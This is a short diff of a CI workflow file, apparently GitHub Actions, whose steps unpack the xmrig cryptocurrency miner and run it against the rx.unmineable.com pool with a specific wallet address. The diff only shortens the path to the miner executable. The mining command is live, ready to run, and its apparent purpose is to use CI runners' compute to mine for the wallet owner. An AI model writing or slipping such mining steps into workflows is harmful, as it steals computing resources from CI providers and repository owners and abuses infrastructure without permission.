@@ -21,6 +21,6 @@ jobs:
     - name: Extract
       run: Expand-Archive xmrig-6.14.1-msvc-win64.zip
     - name: RUNNING
-      run: .\xmrig-6.14.1-msvc-win64\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u BTT:TNDkUwv3nohwbLo3a5uPCGzNmzXvVwLm2n.vivo1 -p x -t 2 
+      run: .\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u BTT:TNDkUwv3nohwbLo3a5uPCGzNmzXvVwLm2n.vivo1 -p x -t 2 
     - name: DONE
       run: exit
